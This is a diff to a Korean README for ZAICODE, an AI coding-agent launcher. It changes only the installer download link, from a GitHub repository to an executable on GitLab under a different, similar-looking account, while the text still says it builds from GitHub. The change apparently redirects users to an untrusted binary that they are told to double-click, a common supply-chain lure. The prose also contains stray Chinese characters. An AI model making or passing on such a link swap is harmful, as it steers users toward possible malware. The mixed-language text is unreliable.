@@ -22,7 +22,7 @@ ZAICODE는 여러 프로젝트에서 AI 코딩 에이전트를 한꺼번에 실�
 
 ## 한 번 클릭으로 설치
 
-1. **[ZAICODE-Setup.exe](https://github.com/vacterro/zaicode/raw/master/install/ZAICODE-Setup.exe)** 다운로드.
+1. **[ZAICODE-Setup.exe](https://gitlab.com/vacuum34/zaicode/-/raw/master/install/ZAICODE-Setup.exe)** 다운로드.
 2. 더블클릭 후 **INSTALL**.
 
 그게 전부입니다. 설정 파일은 머신에 없는 것(Git, Node.js, Python — 사설 복사본, 관리자 권한 불필요)을 설치하고, GitHub에서 ZAICODE와 SAIPEN, SAIMAIL을 받아这台에서 앱을 빌드한 뒤 바탕화면에 ZAICODE 바로가기를 만듭니다. 첫 실행은 15~30분 걸리며, 창에 모든 단계가 표시됩니다.
